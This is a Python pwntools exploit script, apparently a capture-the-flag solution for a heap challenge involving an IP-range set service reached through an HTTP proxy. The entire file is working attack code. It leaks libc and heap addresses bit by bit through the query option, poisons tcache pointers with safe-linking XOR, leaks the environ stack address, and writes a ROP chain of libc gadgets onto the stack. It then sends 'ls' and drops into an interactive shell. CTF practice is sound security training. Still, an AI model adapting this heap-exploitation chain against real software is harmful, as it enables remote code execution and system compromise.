#!/usr/bin/env python
from pwn import *
from time import sleep
import ctypes

context.binary = e = ELF("pwn_patched")
libc = ELF("./libc.so.6")
gs = """
ida_connect
# b edit
source hook.py
# brva 0x0183E
b system
"""


def start():
    # if args.LOCAL:
    #     p = e.process()

    # elif args.REMOTE:  # python x.py REMOTE <host> <port>
    proxy_address = "instance.penguin.0ops.sjtu.cn"
    proxy_port = 18081

    # Target configuration
    target_host = "kgwppkr2jy2pb9pe"
    target_port = 1

    # Establish a connection via the proxy
    proxy = socks.socksocket()
    proxy.set_proxy(socks.HTTP, proxy_address, proxy_port)
    proxy.connect((target_host, target_port))

    # Wrap the connection in pwntools' tube
    p = remote.fromsocket(proxy)
    return p


def create(start, end):
    p.sendlineafter(b'Choose an option: ', b'1')
    p.sendlineafter(b"Please input start ip:", start)
    p.sendlineafter(b'Please input end ip:', end)


def addIpCIDR(start, end):
    p.sendlineafter(b'Choose an option: ', b'2')
    p.sendline(start+b'/'+end)


def addIpSingle(start):
    p.sendlineafter(b'Choose an option: ', b'2')
    p.sendline(start)


def addIpRange(start, end):
    p.sendlineafter(b'Choose an option: ', b'2')
    p.sendline(start+b'-'+end)


def delIpCIDR(start, end):
    p.sendlineafter(b'Choose an option: ', b'3')
    p.sendline(start+b'/'+end)


def delIpSingle(start):
    p.sendlineafter(b'Choose an option: ', b'3')
    p.sendlineafter(b'Please input ip: ', start)


def delIpRange(start, end):
    p.sendlineafter(b'Choose an option: ', b'3')
    p.sendline(start+b'-'+end)


def query(ip):
    p.sendlineafter(b'Choose an option: ', b'4')
    p.sendlineafter(b'Please input ip:', ip)


def delSet():
    p.sendlineafter(b'Choose an option: ', b'5')


# libcDLL = ctypes.CDLL("libc.so.6")

# libcDLL.htonl.argtypes = [ctypes.c_uint32]
# libcDLL.htonl.restype = ctypes.c_uint32

# libcDLL.inet_ntoa.argtypes = [ctypes.c_uint32]
# libcDLL.inet_ntoa.restype = ctypes.c_char_p


def num2IpStr(_ip) -> bytes:

    #     network_order = libcDLL.htonl(ctypes.c_uint32(num))
    #     ip_string = libcDLL.inet_ntoa(network_order)
    #     return ip_string
    _ret = b''
    for i in range(4):
        _ret = b'.' * (i != 3) + str(_ip & 0xff).encode() + _ret
        _ip >>= 8
    return _ret


def _leak(_ip):
    ret = 0
    for i in range(8 * 6):
        query(num2IpStr(_ip + i))
        p.recv(6)
        _ = p.recv(1)
        if (_ == b'i'):
            ret += (1 << i)
    return ret


def _set_chunk():
    _base = 0x37
    create(num2IpStr(_base * 8 + 0x1000000), num2IpStr(_base *
                                                       8 + 0x1000000 + (1 << (_base * 8).bit_length())))

    addIpCIDR(num2IpStr(_base * 8 + 0x1000000 + 9),
              str(32 - (_base * 8).bit_length()).encode())

    create(num2IpStr(_base * 8 + 0x1000000), num2IpStr(_base *
                                                       8 + 0x1000000 + 0x37*8))
    delSet()

    _base += 0x50+0x40
    create(num2IpStr(_base * 8 + 0x1000000 - 1), num2IpStr(_base *
                                                           8 + 0x1000000 + (1 << (_base * 8).bit_length())))
    delIpCIDR(num2IpStr(_base * 8 + 0x1000000 + 10),
              str(32 - (_base * 8).bit_length()).encode())


p = start()

create(num2IpStr(0x13d), num2IpStr(0x13d + 0x578 * 8 - 8))
addIpSingle(num2IpStr(0x13d + 0x478 * 8))
addIpSingle(num2IpStr(0x13d + 0x479 * 8))
delIpCIDR(num2IpStr(0x150), b'24')
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x178 * 8 - 8))
libc.address = _leak(0x13d) - 0x21b0f0
log.info(F"Libc: {hex(libc.address)}")
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x188 * 8 - 8))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x178 * 8 - 8))
_heap = _leak(0x13d) << 12
log.info(f"Heap: {hex(_heap)}")

create(num2IpStr(0x13d), num2IpStr(0x13d + 0x160 * 8 - 8))

create(num2IpStr(0x40), num2IpStr(0x40 + 0x28 * 8 - 8))
delSet()

_set_chunk()

create(num2IpStr(0x13d), num2IpStr(0x13d + 0x28 * 8 - 8))
delSet()

create(num2IpStr(0), num2IpStr(0 + 0x128 * 8 - 8))
addIpSingle(num2IpStr(0x78*8+6))
addIpSingle(num2IpStr(0x78*8))
addIpSingle(num2IpStr(0x79*8+1))
delSet()

create(num2IpStr(0x13d), num2IpStr(0x13d + 0x38 * 8 - 8))
delSet()

create(num2IpStr(0x13d), num2IpStr(0x13d + 0x138 * 8 - 8))
delIpCIDR(num2IpStr(0x150), b'24')
delSet()

create(num2IpStr(0), num2IpStr(0 + 0x128 * 8 - 8))
delIpSingle(num2IpStr(0x79*8+1))
delSet()

create(num2IpStr(0x13d), num2IpStr(0x13d + 0x238 * 8 - 8))
delSet()

create(num2IpStr(0), num2IpStr(0 + 0x128 * 8 - 8))

to_do = (_heap+0x10) ^ ((_heap+0x9d0) >> 12)


def _write(_offset, _value, max_bits=48):

    if _value == 0:
        delIpRange(num2IpStr(_offset * 8), num2IpStr(_offset * 8 + 8 * 6 - 1))
        return

    # count0 = _value.bit_length() - _value.bit_count()
    # _mode = 0
    # if (count0 > _value.bit_count()):
    #     delIpRange(num2IpStr(_offset * 8), num2IpStr(_offset * 8 + 8 * 6 - 1))
    #     _mode = 1
    # else:
    #     addIpRange(num2IpStr(_offset * 8), num2IpStr(_offset * 8 + 8 * 6-1))

    _num = _value.bit_length() % max_bits
    for i in range(_num+1):
        if ((_value & 1)):
            addIpSingle(num2IpStr(_offset * 8 + i))
        elif ((_value & 1) == 0):
            delIpSingle(num2IpStr(_offset * 8 + i))
        _value >>= 1


def _write_payload(data, offset=0):
    payload = ''
    for value in data:
        for i in range(64):
            if (value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    i = 0
    len_ = 8*(len(data)*8-2)
    while (i < len_):
        _right = i
        for j in range(i + 1, len_):
            if (payload[j] != payload[i]):
                _right = j - 1
                break
        if (payload[i] == '1'):
            addIpRange(num2IpStr(i+offset), num2IpStr(_right+offset))
        else:
            delIpRange(num2IpStr(i+offset), num2IpStr(_right+offset))
        print(f"{i} - {_right}")
        i = _right + 1


_write(0x80, to_do, 12)


create(num2IpStr(0x40), num2IpStr(0x40 + 0x38 * 8 - 8))
create(num2IpStr(0), num2IpStr(0 + 0x38 * 8 - 8))
delSet()
create(num2IpStr(0), num2IpStr(0 + (0x290-9) * 8))
_write(5*2, 0x0001_0001_0001)
_write(168, libc.sym.environ-0x10)
_write(168+8, libc.address+0x21A040)

# _write_payload([libc.sym.environ-0x10, libc.address+0x21A040], 168)

delSet()
create(num2IpStr(0), num2IpStr(0 + (0x70-9) * 8))
environ = _leak(0x10*8)
log.success(hex(environ))

create(num2IpStr(0), num2IpStr(0 + (0x290-9) * 8))
_write(5*2, 0x0001_0001_0001)
_write(168, environ+0x110-0x38)
create(num2IpStr(0), num2IpStr(0 + (0x70-9) * 8))

ropChain = [libc.address+0x00000000000a8558,
            libc.address+0x000000000009c58c, libc.address+0xebc88]


_write_payload(ropChain)

if args.GDB:
    gdb.attach(p, gdbscript=gs +
               f"\nb *{hex(libc.address+0x00000000001211ad)}\n")
    pause()

create(num2IpStr(0), num2IpStr(0 + (0x80-9) * 8))
_write(0, libc.address+0x00000000001211ad)

delSet()
p.sendline(b'ls')

p.interactive()
